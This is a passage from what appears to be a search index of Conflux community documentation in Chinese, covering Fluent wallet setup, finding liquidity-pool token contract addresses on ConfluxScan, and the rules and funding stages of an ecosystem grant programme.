\u70b9\u51fb\u4e0b\u4e00\u6b65\uff0c\u5e76\u5907\u4efd\u52a9\u8bb0\u8bcd \u52a9\u8bb0\u8bcd\u8bb0\u5f55\u5728\u5b89\u5168\u7684\u4f4d\u7f6e\u540e\uff0c\u70b9\u51fb\u4e0b\u4e00\u6b65\uff0c\u5e76\u9a8c\u8bc1\u52a9\u8bb0\u8bcd\u987a\u5e8f \u5f85\u9a8c\u8bc1\u6210\u529f\u540e\u70b9\u51fb\u201c\u521b\u5efa\u201d\u6309\u94ae","title":"Fluent\u94b1\u5305\u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4"},{"location":"development/fluent/#fluent","text":"\u8003\u8651\u5230\u90e8\u5206\u540c\u5fd7FQ\u96be\u7684\u95ee\u9898\uff0c\u7279\u4f7f\u7528Edge\u6d4f\u89c8\u5668\u7ed9\u5404\u4f4d\u89c2\u4f17\u8001\u7237\u4eec\u8fdb\u884c\u5c55\u793a","title":"Fluent\u94b1\u5305\u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4"},{"location":"development/fluent/#edgefluent","text":"\u4f7f\u7528edge\u8bbf\u95ee \u5fae\u8f6f\u5e94\u7528\u5546\u5e97 \u641c\u7d22\u201cfluent\u201d\u5173\u952e\u5b57 \u70b9\u51fb\u201c\u83b7\u53d6\u6309\u94ae\u201d\u5728\u5f39\u51fa\u7a97\u53e3\u4e2d\u70b9\u51fb\u201c\u6dfb\u52a0\u6269\u5c55\u201d \u901a\u8fc7Edge\u53f3\u4e0a\u89d2\u4fa7\u8fb9\u680f\u5373\u53ef\u8bbf\u95eeFluent\u94b1\u5305 \u70b9\u51fbFluent\u94b1\u5305\u5185\u7684\u201c\u521b\u5efa\u201d\u6309\u94ae\uff0c\u5e76\u8bbe\u7f6e\u89e3\u9501\u5bc6\u7801 \u5f85\u5bc6\u7801\u8bbe\u7f6e\u5b8c\u6bd5\u540e\uff0c\u70b9\u51fb\u201c\u521b\u5efa\u201d\u6309\u94ae Fluent\u76ee\u524d\u652f\u6301\u901a\u8fc7\u4e09\u79cd\u65b9\u5f0f\u83b7\u53d6\u4e00\u4e2aConflux\u7f51\u7edc\u94b1\u5305\u5730\u5740\uff0c\u5206\u522b\u662f\u201c\u4f7f\u7528\u65b0\u52a9\u8bb0\u8bcd\u751f\u6210\u201d\u3001\u201c\u5bfc\u5165\u5df2\u6709\u52a9\u8bb0\u8bcd\u201d\u3001\u201c\u5bfc\u5165\u79c1\u94a5\u201d\u4e09\u79cd","title":"\u4f7f\u7528Edge\u5b89\u88c5Fluent\u94b1\u5305"},{"location":"development/fluent/#_1","text":"\u5982\u679c\u60a8\u662fConflux\u7f51\u7edc\u7684\u65b0\u7528\u6237\uff0c \u8bf7\u4f7f\u7528\u201c\u521b\u5efa\u8d26\u6237\u201d\u529f\u80fd\u4e2d\u7684->\u201c\u65b0\u7684\u52a9\u8bb0\u8bcd\u201d\u529f\u80fd \uff0c\u751f\u6210\u4e00\u7ec4\u65b0\u7684\u52a9\u8bb0\u8bcd\u3002\u6ce8\u610f\uff0c\u60a8\u9700\u8981\u5907\u4efd\u60a8\u7684\u52a9\u8bb0\u8bcd\u5230\u4e00\u4e2a\u5b89\u5168\u4e14\u4ed6\u4eba\u4e0d\u53ef\u89c1\u7684\u4f4d\u7f6e\uff0c\u4ee5\u786e\u4fdd\u60a8\u7684\u8d26\u6237\u5b89\u5168\u3002 \u5982\u679c\u60a8\u66fe\u7ecf\u4f7f\u7528Conflux Portal\u521b\u5efa\u8fc7\u94b1\u5305\uff08\u53ef\u53c2\u8003 \u6559\u7a0b \u4e2d\u5907\u4efd\u7684\u52a9\u8bb0\u8bcd\uff09\uff0c \u8bf7\u4f7f\u7528\u201c\u5bfc\u5165\u8d26\u6237\u201d\u529f\u80fd\u4e2d\u7684->\u201c\u5bfc\u5165\u52a9\u8bb0\u8bcd\u201d\u65b9\u6cd5 \u5c06\u5728\u521b\u5efaPortal\u94b1\u5305\u65f6\u5907\u4efd\u7684\u52a9\u8bb0\u8bcd\u5bfc\u5165Fluent\u3002 \u5982\u679c\u60a8\u4ecd\u7136\u6301\u6709keystore\u5f62\u5f0f\u7684\u94b1\u5305\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528Portal\u7684\u79c1\u94a5\u5bfc\u51fa\u529f\u80fd\uff0c\u5907\u4efdkeystore\u5f62\u5f0f\u5730\u5740\u7684\u660e\u6587\u79c1\u94a5\uff0c\u5e76\u4f7f\u7528Fluent\u63d0\u4f9b\u7684\u201c\u5bfc\u5165\u79c1\u94a5\u201d\u529f\u80fd\u6062\u590dkeystore\u94b1\u5305\u6240\u5bf9\u5e94\u7684\u8d26\u6237\u3002","title":"\u5982\u4f55\u786e\u5b9a\u6211\u4f7f\u7528\u54ea\u79cd\u65b9\u5f0f\u5bfc\u5165\u94b1\u5305"},{"location":"development/fluent/#_2","text":"\u70b9\u51fb\u201c\u65b0\u7684\u52a9\u8bb0\u8bcd\u201d\u6309\u94ae \u70b9\u51fb\u4e0b\u4e00\u6b65\uff0c\u5e76\u5907\u4efd\u52a9\u8bb0\u8bcd \u52a9\u8bb0\u8bcd\u8bb0\u5f55\u5728\u5b89\u5168\u7684\u4f4d\u7f6e\u540e\uff0c\u70b9\u51fb\u4e0b\u4e00\u6b65\uff0c\u5e76\u9a8c\u8bc1\u52a9\u8bb0\u8bcd\u987a\u5e8f \u5f85\u9a8c\u8bc1\u6210\u529f\u540e\u70b9\u51fb\u201c\u521b\u5efa\u201d\u6309\u94ae","title":"\u4ee5\u521b\u5efa\u8d26\u6237\u4e3a\u4f8b"},{"location":"development/get-lp-token-address/","text":"\u67e5\u627eLP\u4ee3\u5e01\u7684\u5408\u7ea6\u5730\u5740 \u00b6 \u7531\u4e8e\u90e8\u5206\u751f\u6001\u9879\u76ee\u5b58\u5728\u8f6c\u79fbLP\u4ee3\u5e01\u7684\u9700\u6c42\uff0c Conflux Portal \u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u53c2\u8003 \u6dfb\u52a0 CRC20 \u4ee3\u5e01\u5230 Portal \u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4-\u5408\u7ea6\u5730\u5740\u81ea\u5b9a\u4e49\u6dfb\u52a0 LP \u7684\u65b9\u6cd5\u6dfb\u52a0LP\u81f3Portal\u4ee3\u5e01\u5217\u8868\u4e2d\u5e76\u8fdb\u884c\u8f6c\u8d26\u64cd\u4f5c\uff0c\u672c\u6587\u5c06\u7ed9\u51fa\u5982\u4f55\u5229\u7528Conflux Scan\u7684\u65b9\u6cd5\uff0c\u627e\u5230\u5408\u7ea6\u5730\u5740 \u4ee5\u67e5\u627eyao/cfx\u8fd9\u4e00LP\u5bf9\u4e3a\u4f8b \u00b6 \u8003\u8651\u5230CFX\u6301\u6709\u4eba\u5f88\u591a\uff0c\u5f88\u96be\u901a\u8fc7\u67e5\u8be2CFX\u6301\u6709\u4eba\u6392\u540d\u7684\u65b9\u5f0f\u83b7\u53d6\u5230yao/cfx\u8fd9\u4e00\u5408\u7ea6\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6362\u4e2a\u601d\u8def\uff0c\u4ee5yao\u4e3a\u67e5\u627e\u5bf9\u8c61\uff0c\u6700\u7ec8\u901a\u8fc7\u67e5\u8be2yao\u7684\u6301\u6709\u4eba\u6392\u540d\u627e\u5230\u5bf9\u5e94\u7684yao/cfx\u5408\u7ea6\u5730\u5740\u3002 \u8bbf\u95ee ConfluxScan \uff0c\u5728\u641c\u7d22\u6846\u5185\u8f93\u5165\u201cyao\u201d \u70b9\u8fdb\u53bb\uff0c\u53d1\u73b0\u6709\u4e00\u4e2a\u6301\u6709\u4eba\u680f\u76ee \u53d1\u73b0\u4e00\u4e2a\u53ef\u80fd\u7684\u7684\u6301\u6709\u4eba\uff0c\u540d\u4e3a\u201cMoonSwap LP Token\u201d \u70b9\u8fdb\u53bb\u4e00\u63a2\u7a76\u7adf\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u6211\u4eec\u9700\u8981\u627e\u7684LP\u5bf9\uff08\u539f\u56e0\u662f\u901a\u8fc7\u5408\u7ea6\u9501\u4f4f\u4e86yao/cfx\u4e24\u79cd\u4ee3\u5e01\uff09\uff1a\u5176\u4e2dcfx\u505a\u4e86Wrapped\u7684\u5904\u7406\uff0cwcfx\u4e0ecfx\u4e4b\u95f4\u53ef1:1\u5151\u6362\uff0c\u5177\u4f53\u53ef\u53c2\u8003 WCFX \u4e0e CFX \u4ee3\u5e01\u4e92\u6362 \u590d\u5236LP\u4ee3\u5e01\u5408\u7ea6\u5730\u5740\uff1acfx:acgda4p2gcmutnn9vx9mug6mxtvm39umaanedvujn3 \u4ee5\u67e5\u627efc/moon\u8fd9\u4e00LP\u5bf9\u4e3a\u4f8b \u00b6 \u8003\u8651\u5230FC\u7684\u6301\u6709\u4eba\u548cmoon\u7684\u6301\u6709\u4eba\u90fd\u8fd8\u7b97\u7a33\u5b9a\uff0c\u53ef\u4ee5\u4ee5fc\u4e3a\u67e5\u627e\u5bf9\u8c61\uff0c\u6700\u7ec8\u627e\u5230\u5bf9\u5e94\u7684fc/moon\u5408\u7ea6\u5730\u5740\u3002 \u8bbf\u95ee Conflux CRC20\u5217\u8868 \uff0c\u53ef\u4ee5\u627e\u5230FC\u4ee3\u5e01 \u70b9\u8fdb\u53bb\u67e5\u770b\u4ee3\u5e01\u6301\u6709\u4eba \u53d1\u73b0\u53ef\u80fd\u7684LP\u6301\u6709\u5730\u5740\u94fe\u63a5 \u70b9\u8fdb\u53bb\u4e00\u63a2\u7a76\u7adf\uff0c\u53d1\u73b0\u662fCFX\u548cFC\u7684LP\u5408\u7ea6\uff0cLP\u5408\u7ea6\u5730\u5740\u4e3a\uff1acfx:acg9nhwyrb592kjthzukgwv4k2kyxajepab1fz6ywf \u56de\u9000\u5230\u4e0a\u4e00\u9875\uff0c\u53d1\u73b0\u6301\u6709\u4eba\u5185\u6709cMoon/FC \u70b9\u8fdb\u53bb\u67e5\u770b\uff0c\u53d1\u73b0\u7b26\u5408moon/FC\u914d\u5bf9\u7279\u5f81 \u8be5LP\u5730\u5740\u4e3a\uff1acfx:aca45uhpk2d1j7vf8y927mr79w4bzne0vyfg9muytu \u6700\u7b80\u5355\u7684\u67e5\u627e\u65b9\u6cd5 \u00b6 \u76f4\u63a5\u641c\u7d22\u201cMLP\u201d\u5173\u952e\u5b57","title":"\u67e5\u627eLP\u4ee3\u5e01\u7684\u5408\u7ea6\u5730\u5740"},{"location":"development/get-lp-token-address/#lp","text":"\u7531\u4e8e\u90e8\u5206\u751f\u6001\u9879\u76ee\u5b58\u5728\u8f6c\u79fbLP\u4ee3\u5e01\u7684\u9700\u6c42\uff0c Conflux Portal \u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u53c2\u8003 \u6dfb\u52a0 CRC20 \u4ee3\u5e01\u5230 Portal \u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4-\u5408\u7ea6\u5730\u5740\u81ea\u5b9a\u4e49\u6dfb\u52a0 LP \u7684\u65b9\u6cd5\u6dfb\u52a0LP\u81f3Portal\u4ee3\u5e01\u5217\u8868\u4e2d\u5e76\u8fdb\u884c\u8f6c\u8d26\u64cd\u4f5c\uff0c\u672c\u6587\u5c06\u7ed9\u51fa\u5982\u4f55\u5229\u7528Conflux Scan\u7684\u65b9\u6cd5\uff0c\u627e\u5230\u5408\u7ea6\u5730\u5740","title":"\u67e5\u627eLP\u4ee3\u5e01\u7684\u5408\u7ea6\u5730\u5740"},{"location":"development/get-lp-token-address/#yaocfxlp","text":"\u8003\u8651\u5230CFX\u6301\u6709\u4eba\u5f88\u591a\uff0c\u5f88\u96be\u901a\u8fc7\u67e5\u8be2CFX\u6301\u6709\u4eba\u6392\u540d\u7684\u65b9\u5f0f\u83b7\u53d6\u5230yao/cfx\u8fd9\u4e00\u5408\u7ea6\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6362\u4e2a\u601d\u8def\uff0c\u4ee5yao\u4e3a\u67e5\u627e\u5bf9\u8c61\uff0c\u6700\u7ec8\u901a\u8fc7\u67e5\u8be2yao\u7684\u6301\u6709\u4eba\u6392\u540d\u627e\u5230\u5bf9\u5e94\u7684yao/cfx\u5408\u7ea6\u5730\u5740\u3002 \u8bbf\u95ee ConfluxScan \uff0c\u5728\u641c\u7d22\u6846\u5185\u8f93\u5165\u201cyao\u201d \u70b9\u8fdb\u53bb\uff0c\u53d1\u73b0\u6709\u4e00\u4e2a\u6301\u6709\u4eba\u680f\u76ee \u53d1\u73b0\u4e00\u4e2a\u53ef\u80fd\u7684\u7684\u6301\u6709\u4eba\uff0c\u540d\u4e3a\u201cMoonSwap LP Token\u201d \u70b9\u8fdb\u53bb\u4e00\u63a2\u7a76\u7adf\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u6211\u4eec\u9700\u8981\u627e\u7684LP\u5bf9\uff08\u539f\u56e0\u662f\u901a\u8fc7\u5408\u7ea6\u9501\u4f4f\u4e86yao/cfx\u4e24\u79cd\u4ee3\u5e01\uff09\uff1a\u5176\u4e2dcfx\u505a\u4e86Wrapped\u7684\u5904\u7406\uff0cwcfx\u4e0ecfx\u4e4b\u95f4\u53ef1:1\u5151\u6362\uff0c\u5177\u4f53\u53ef\u53c2\u8003 WCFX \u4e0e CFX \u4ee3\u5e01\u4e92\u6362 \u590d\u5236LP\u4ee3\u5e01\u5408\u7ea6\u5730\u5740\uff1acfx:acgda4p2gcmutnn9vx9mug6mxtvm39umaanedvujn3","title":"\u4ee5\u67e5\u627eyao/cfx\u8fd9\u4e00LP\u5bf9\u4e3a\u4f8b"},{"location":"development/get-lp-token-address/#fcmoonlp","text":"\u8003\u8651\u5230FC\u7684\u6301\u6709\u4eba\u548cmoon\u7684\u6301\u6709\u4eba\u90fd\u8fd8\u7b97\u7a33\u5b9a\uff0c\u53ef\u4ee5\u4ee5fc\u4e3a\u67e5\u627e\u5bf9\u8c61\uff0c\u6700\u7ec8\u627e\u5230\u5bf9\u5e94\u7684fc/moon\u5408\u7ea6\u5730\u5740\u3002 \u8bbf\u95ee Conflux CRC20\u5217\u8868 \uff0c\u53ef\u4ee5\u627e\u5230FC\u4ee3\u5e01 \u70b9\u8fdb\u53bb\u67e5\u770b\u4ee3\u5e01\u6301\u6709\u4eba \u53d1\u73b0\u53ef\u80fd\u7684LP\u6301\u6709\u5730\u5740\u94fe\u63a5 \u70b9\u8fdb\u53bb\u4e00\u63a2\u7a76\u7adf\uff0c\u53d1\u73b0\u662fCFX\u548cFC\u7684LP\u5408\u7ea6\uff0cLP\u5408\u7ea6\u5730\u5740\u4e3a\uff1acfx:acg9nhwyrb592kjthzukgwv4k2kyxajepab1fz6ywf \u56de\u9000\u5230\u4e0a\u4e00\u9875\uff0c\u53d1\u73b0\u6301\u6709\u4eba\u5185\u6709cMoon/FC \u70b9\u8fdb\u53bb\u67e5\u770b\uff0c\u53d1\u73b0\u7b26\u5408moon/FC\u914d\u5bf9\u7279\u5f81 \u8be5LP\u5730\u5740\u4e3a\uff1acfx:aca45uhpk2d1j7vf8y927mr79w4bzne0vyfg9muytu","title":"\u4ee5\u67e5\u627efc/moon\u8fd9\u4e00LP\u5bf9\u4e3a\u4f8b"},{"location":"development/get-lp-token-address/#_1","text":"\u76f4\u63a5\u641c\u7d22\u201cMLP\u201d\u5173\u952e\u5b57","title":"\u6700\u7b80\u5355\u7684\u67e5\u627e\u65b9\u6cd5"},{"location":"development/incentive-guide/","text":"\u751f\u6001\u6fc0\u52b1\u6307\u5357 \u00b6 \u611f\u8c22\u652f\u6301Conflux\u751f\u6001\u5efa\u8bbe\uff0c\u672c\u6587\u5c06\u4f1a\u5927\u5bb6\u6700\u5173\u5fc3\u7684\u751f\u6001\u9879\u76ee\u6fc0\u52b1\u89c4\u5219\u3001\u91d1\u989d\u3001\u6d41\u7a0b\u3001\u9a8c\u6536\u7b49\u95ee\u9898\u8fdb\u884c\u9610\u91ca\u3002 \u672c\u6587\u7531Conflux\u6280\u672f\u793e\u533a\u8bc4\u5ba1\u5c0f\u7ec4\u6210\u5458\u5171\u540c\u7f16\u7e82\u800c\u6210\uff0c\u5e0c\u671b\u901a\u8fc7\u672c\u89c4\u5219\u66f4\u80fd\u591f\u597d\u7684\u670d\u52a1\u524d\u6765Conflux\u8fdb\u884c\u751f\u6001\u5efa\u8bbe\u7684\u56e2\u961f\u3002 \u672c\u6587\u5c06\u5728\u540e\u7eed\u65bd\u884c\u8fc7\u7a0b\u4e2d\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u6301\u7eed\u66f4\u65b0\u8fed\u4ee3\uff0c\u6b22\u8fce\u5404\u4f4d\u670b\u53cb\u968f\u65f6\u63d0\u51fa\u5b9d\u8d35\u610f\u89c1\u3001\u5efa\u8bae\u3002 \u672c\u6587\u6700\u7ec8\u89e3\u91ca\u6743\u5f52Coonflux\u6280\u672f\u793e\u533a\u4ee5\u53caConflux\u57fa\u91d1\u4f1a\u56e2\u961f\u6240\u6709\u3002 \u4e00\u3001Conflux\u751f\u6001\u6fc0\u52b1\u8ba1\u5212 \u00b6 Conflux\u751f\u6001\u6276\u6301\u8ba1\u5212\u662f\u751f\u6001\u9879\u76ee\u7684\u5b75\u5316\u5668\uff0c\u4e3aConflux\u94fe\u4e0a\u6709\u6f5c\u529b\u7684\u751f\u6001\u9879\u76ee\u63d0\u4f9b\u5305\u62ec\u5e02\u573a\u3001\u57fa\u7840\u670d\u52a1\u3001\u4fe1\u606f\u670d\u52a1\u3001\u8865\u8d34\u653f\u7b56\u5728\u5185\u7684\u5404\u79cd\u5b75\u5316\u670d\u52a1\uff0c\u5168\u65b9\u4f4d\u652f\u6301\u751f\u6001\u9879\u76ee\u7684\u53d1\u5c55\u4e0e\u63a8\u5e7f\u3002 \u6fc0\u52b1\u539f\u5219 1\u3001\u4f18\u5148\u9f13\u52b1\u63a2\u7d22\u751f\u6001\u56fe\u8c31\u4e0a\u8fd8\u672a\u5f00\u53d1\u7684\u9879\u76ee\u65b9\u5411\uff0c\u5c3d\u91cf\u907f\u514d\u540c\u7c7b\u578b\u9879\u76ee\u624e\u5806\u5185\u5377\uff0c\u4f46\u4e0d\u9650\u5236\u5df2\u6709\u7c7b\u578b\u9879\u76ee\u7533\u8bf7\u3002 2\u3001L1\u9636\u6bb5\u9879\u76ee\u4e3b\u8981\u76ee\u7684\u4e3a\u9a8c\u8bc1\u9879\u76ee\u65b9\u662f\u5426\u5177\u6709\u6301\u7eed\u5f00\u53d1\u8fed\u4ee3\u7684\u80fd\u529b\u548c\u6280\u672f\u6c34\u5e73\uff0cL1 \u9636\u6bb5\u7684\u76ee\u6807\u5e94\u8be5\u662f\u4e00\u4e2a\u7528\u6237\u5df2\u7ecf\u53ef\u4ee5\u4f7f\u7528\u7684demo\uff0c\u539f\u5219\u4e0a\u9700\u8981\u5728\u8bc4\u5ba1\u901a\u8fc7\u540e2\u6708\u5185\u5b8c\u6210\uff0c\u5982\u679c\u65e0\u6cd5\u6309\u671f\u5b8c\u6210\u9700\u8981\u63d0\u524d\u4e00\u5468\u7533\u8bf7\u5e76\u8bf4\u660e\u7406\u7531\u3002 3\u3001L2\u9636\u6bb5\u9879\u76ee\u4e3b\u8981\u76ee\u7684\u4e3a\u9a8c\u8bc1\u9879\u76ee\u65b9\u662f\u5426\u5177\u6709\u5b9e\u73b0\u529f\u80fd\u6027\u6307\u6807\u7684\u80fd\u529b\uff0c\u8003\u5bdf\u5305\u542b\u5176\u56e2\u961f\u6280\u672f\u6c34\u5e73\u53ca\u8fd0\u8425\u6c34\u5e73\u7b49\u7efc\u5408\u80fd\u529b\uff0cL2\u9636\u6bb5\u7684\u76ee\u6807\u5e94\u8be5\u662f\u5b9e\u73b0L1\u9636\u6bb5\u9a8c\u6536\u901a\u8fc7\u540e\u8bbe\u5b9a\u7684\u7cfb\u5217\u5173\u952e\u6307\u6807\u548c\u529f\u80fd\uff0c\u539f\u5219\u4e0a\u9700\u8981\u5728\u8bc4\u5ba1\u901a\u8fc7\u540e6\u4e2a\u6708\u5185\u5b8c\u6210\uff0c\u5982\u679c\u65e0\u6cd5\u6309\u671f\u5b8c\u6210\u9700\u8981\u63d0\u524d\u4e00\u5468\u7533\u8bf7\u5e76\u8bf4\u660e\u7406\u7531\u3002 4\u3001L1\u3001L2\u9636\u6bb5\u6fc0\u52b1\u5747\u4e3a\u62a5\u9500\u5236\u3002\u8bc4\u5ba1\u5c0f\u7ec4\u5c06\u4ee5\u5f00\u53d1\u5de5\u4f5c\u91cf\u4f5c\u4e3a\u6fc0\u52b1\u91d1\u989d\u8bc4\u5ba1\u7684\u4f9d\u636e\uff0c\u4f18\u5148\u6fc0\u52b1\u5b8c\u5168\u5f00\u6e90\u9879\u76ee\uff0c\u5bf9\u4e0d\u5f00\u6e90\u9879\u76ee\u51cf\u5c11\u6fc0\u52b1\u91d1\u989d\u5230\u5f00\u6e90\u9879\u76ee\u768460%\u6216\u8bbe\u5b9a\u8fd0\u8425\u7c7b\u7684\u6307\u6807\uff0c\u670d\u52a1\u5668\u7b49\u6210\u672c\u6700\u591a\u627f\u62c5\u534a\u5e74\u3002 5\u3001\u5305\u542bIDO\u7b49\u56fd\u5185\u6cd5\u5f8b\u4e0d\u5141\u8bb8\u5185\u5bb9\u7684\u9879\u76ee\uff0c\u8bf7\u76f4\u63a5\u4ece\u6d77\u5916grants\u7533\u8bf7\u3002 6\u3001\u53d1\u653e\u6fc0\u52b1\u7684\u76ee\u7684\u662f\u4e3a\u4e86kick start\u4e00\u4e9b\u5728\u672a\u6765\u80fd\u591f\u771f\u6b63\u88ab\u7528\u6237\u4f7f\u7528\u7684\u4ea7\u54c1\uff0c\u88ab\u7528\u6237\u63a5\u7eb3\u4ece\u800c\u81ea\u5df1\u9020\u8840\uff0c\u800c\u975e\u5355\u7eaf\u7684\u52b3\u52a1\u5916\u5305\u3002\u6240\u4ee5\uff0c\u6bcf\u9636\u6bb5\u7533\u8bf7\u548c\u9a8c\u6536\u65f6\uff0c\u9879\u76ee\u65b9\u521b\u4e1a\u56e2\u961f\u90fd\u9700\u8981\u6e05\u695a\u81ea\u5df1\u63a5\u4e0b\u6765\u7684\u76ee\u6807\u4efb\u52a1\u548c\u8ba1\u5212\u3002 \u65b0\u56e2\u961f\u52a0\u5165Conflux\uff0c\u4e0d\u7ba1\u662f\u8fc1\u79fb\u6210\u719f\u9879\u76ee\u4e0a\u94fe\u3001\u5728Conflux\u4e0a\u5b75\u5316\u8fd8\u662f\u60f3\u8ddf\u793e\u533a\u4e00\u8d77\u505a\u9879\u76ee\uff0c\u90fd\u53ef\u4ee5\u5411Conflux\u7533\u8bf7\u6276\u6301\u3002\u9664\u7ecf\u6d4e\u6fc0\u52b1\u5916\uff0cConflux\u751f\u6001\u6276\u6301\u9879\u76ee\u8fd8\u53ef\u4ee5\u83b7\u5f97\u4ee5\u4e0b\u670d\u52a1\uff1a \u5e02\u573a\u670d\u52a1 \u56fd\u5185\u5ba3\u53d1\uff1a\u6587\u7ae0\u3001\u91cd\u8981\u4e8b\u4ef6\u3001\u65f6\u95f4\u8282\u70b9 \u7ebf\u4e0a\u6d3b\u52a8\u5bf9\u63a5\uff1aAMA\u3001\u76f4\u64ad\u7b49 \u7ebf\u4e0b\u6d3b\u52a8\uff08\u6280\u672f\u6c99\u9f99\uff0c\u4e13\u9898\u6c99\u9f99\uff0c\u5927\u578b\u5cf0\u4f1a\uff09\u5bf9\u63a5 \u6280\u672f\u793e\u533a\u6d4b\u8bd5\u5c0f\u7ec4Beta Test \u4e2d\u56fd\u793e\u533a\uff1aConflux\u793e\u533a/\u5408\u4f5c\u4f19\u4f34/KOL\u793e\u533aAMA\uff0c\u76f4\u64ad\u7b49\u7ebf\u4e0a\u5ba3\u53d1 \u56e2\u961f\u642d\u5efa\uff1a\u793e\u533a\u5927\u4f7f/\u7ba1\u7406\u5458\uff0c\u524d\u540e\u7aef\u5de5\u7a0b\u5e08\u7b49\u4eba\u9009\u63a8\u8350 Conflux\u751f\u6001\u9879\u76ee\u8054\u52a8 Conflux\u4e2d\u56fd\u884c \u529e\u516c\u573a\u5730 \u6d77\u5916PR\uff1a\u6838\u5fc3\u5185\u5bb9\u591a\u8bed\u8a00\u7ffb\u8bd1\u3001\u5ba3\u53d1 \u6d77\u5916\u793e\u533a\uff1aConflux\u793e\u533a\u53ca\u5408\u4f5c\u4f19\u4f34\u793e\u533aAMA\u7b49\u7ebf\u4e0a\u6d3b\u52a8 \u6d77\u5916\u793e\u533a\uff1a0-1\u793e\u533a\u642d\u5efa \u57fa\u7840\u670d\u52a1 BTC/ETH/HECO/BSC/OKEX \u8d44\u4ea7\u8de8\u94fe\u6280\u672f\u652f\u6301 \u4fe1\u606f\u670d\u52a1 Conflux Scan \u667a\u80fd\u5408\u7ea6\u4fe1\u606f\u6ce8\u518c\uff0c\u8d44\u4ea7\u4fe1\u606f\u6ce8\u518c \u4e0a\u67b6 DAppBirds dApp \u5546\u5e97\uff0c\u9996\u9875\u63a8\u8350 \u767b\u9646 Conflux \u5b98\u7f51\u7684\u751f\u6001\u9875\u9762 \u8865\u8d34\u653f\u7b56 Conflux \u4e0a\u6240\u6709\u667a\u80fd\u5408\u7ea6\u4ee3\u4ed8\u8865\u8d34 \u4e8c\u3001Conflux\u751f\u6001\u6fc0\u52b1\u9636\u6bb5\u5212\u5206 \u00b6 Conflux\u751f\u6001\u9879\u76ee\u6fc0\u52b1\u5171\u5206\u4e3a3\u9636\u6bb5\uff0c\u5206\u522b\u4e3a L1\u9636\u6bb5\uff08\u6700\u9ad8\u6fc0\u52b115K USDT\uff09\u3001L2\u9636\u6bb5\uff08\u9ad8\u8fbe50K USDT)\u3001L3\u9636\u6bb5\uff08\u9ad8\u8fbe100K USDT\uff09 \u3002 \u5728L1\u9636\u6bb5\u9a8c\u6536\u901a\u8fc7\u540e\uff0c\u9879\u76ee\u5373\u53ef\u8fdb\u5165L2\u9636\u6bb5\u3002 \u5728L1\u3001L2\u9636\u6bb5\u9a8c\u6536\u5747\u901a\u8fc7\u540e\uff0c\u9879\u76ee\u5373\u53ef\u8fdb\u5165L3\u9636\u6bb5\u3002\u8fdb\u5165L3\u9636\u6bb5\u7684\u56e2\u961f\u5c06\u76f4\u63a5\u4e0eConflux\u516c\u53f8\u5e02\u573a\u3001\u5546\u52a1\u7b49\u90e8\u95e8\u8fdb\u884c\u63a5\u6d3d\uff0c\u7531Conflux\u5b98\u65b9\u76f8\u5173\u4eba\u5458\u786e\u5b9a\u6fc0\u52b1\u65b9\u5f0f\u3001\u91d1\u989d\u4ee5\u53ca\u53d1\u653e\u6761\u4ef6\u3002 \u5305\u542b\u4f46\u4e0d\u9650\u4e8eIDO\u5728\u5185\u7684\u4e00\u5207\u6709\u4e2d\u56fd\u6cd5\u5f8b\u98ce\u9669\u5185\u5bb9\u7684\u9879\u76ee\u8bf7\u76f4\u63a5\u7533\u8bf7\u6d77\u5916Grants\uff0c\u7533\u8bf7\u94fe\u63a5\uff1a https://forum.conflux.fun/c/English/grant-proposals \u3002 \u56e0\u793e\u533a\u4e3b\u8981\u8d1f\u8d23\u5bf9\u9879\u76eeL1\u3001L2\u9636\u6bb5\u8fdb\u884c\u8bc4\u5ba1\u9a8c\u6536\uff0c\u6240\u4ee5\u672c\u89c4\u5219\u5c06\u91cd\u70b9\u5173\u6ce8\u9879\u76eeL1\u3001L2\u9636\u6bb5\u7684\u8bc4\u5ba1\u8981\u6c42 \u4e09\u3001\u6fc0\u52b1\u8303\u56f4 \u00b6 \u57fa\u7840\u8bbe\u65bd\uff1a\u5f00\u53d1\u8de8\u94fe\u8d44\u4ea7\u3001\u6570\u636e\u7b49\u57fa\u7840\u8bbe\u65bd\u7ec4\u4ef6\u5de5\u5177 \u4e92\u8054\u4e92\u901a\uff0c\u94fe\u63a5\u5176\u4ed6\u533a\u5757\u94fe\u7f51\u7edc \u8de8\u94fe\u6280\u672f \u9884\u8a00\u673a\u5f00\u53d1\uff0c\u9488\u5bf9\u94fe\u4e0a\u548c\u94fe\u4e0b\u6570\u636e \u5f00\u53d1\u8005\u5de5\u5177\uff0c\u5982\u5206\u6790\u3001\u67e5\u8be2\u7b49 \u901a\u8bc1\u6807\u51c6\uff0c\u5982 NFT\u3001RFT \u548c\u540c\u8d28\u5316\u901a\u8bc1\u7b49\u4ef7\u7269\u7684\u6807\u51c6 \u8eab\u4efd\u9a8c\u8bc1\uff0c\u5982\u94b1\u5305\u3001KYC\u3001\u8bc1\u4e66\u8ba4\u8bc1\u7b49 \u5b89\u5168\u5de5\u5177\uff0c\u5982\u5ba1\u8ba1\u3001\u5bc6\u94a5\u7ba1\u7406\u3001\u6258\u7ba1\u89e3\u51b3\u65b9\u6848\u7b49 \u79fb\u52a8\u7aef\u548c\u6e38\u620f\u5f00\u53d1\u5de5\u5177 \u5e02\u573a\u4fe1\u606f\u805a\u5408\u5de5\u5177 \u96c6\u6210\u94b1\u5305 \u793e\u533a\uff1a\u793e\u533a\u53d1\u5c55\u3001\u7ba1\u7406\u548c\u8fd0\u4f5c \u4ef2\u88c1\u3001DAO\u3001\u6295\u7968\u53ca\u6cbb\u7406 \u6570\u5b57\u8d44\u4ea7\u7ba1\u7406\u901a\u8bc1\u6807\u51c6\u5de5\u5177\uff0c\u5982\u7a33\u5b9a\u5e01\u3001NFT\u3001\u8de8\u94fe\u8d44\u4ea7 \u52a0\u5bc6\u7ecf\u6d4e\u5b66\u5e94\u7528\u4ea7\u54c1\u7684\u5b9a\u4ef7\u3001\u76d1\u7ba1\u3001\u8d28\u62bc\u7b49 